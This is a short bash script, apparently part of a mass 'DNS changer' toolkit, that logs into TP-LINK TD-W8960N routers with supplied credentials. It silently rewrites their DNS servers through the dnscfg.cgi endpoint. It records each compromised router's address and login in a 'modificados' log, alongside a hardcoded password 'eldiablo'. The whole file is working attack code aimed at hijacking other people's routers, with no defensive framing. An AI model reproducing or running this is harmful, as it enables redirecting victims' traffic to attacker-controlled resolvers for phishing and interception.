@@ -1,0 +1,17 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+
+${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/dnscfg.cgi?dnsPrimary=$DNS1&dnsSecondary=$DNS2&dnsIfc=&dnsRefresh=1&autoDns=0" 1>/dev/null 2>/dev/null
+echo "[+] modificado, http://${HOSTNAME} ${USERNAME}:${PASSWORD} [TP-LINK TD-W8960N]"
+echo "http://${HOSTNAME} (${USERNAME}:${PASSWORD} => ${PASSWD}) [TP-LINK TD-W8960N]" >> logs/modificados.log
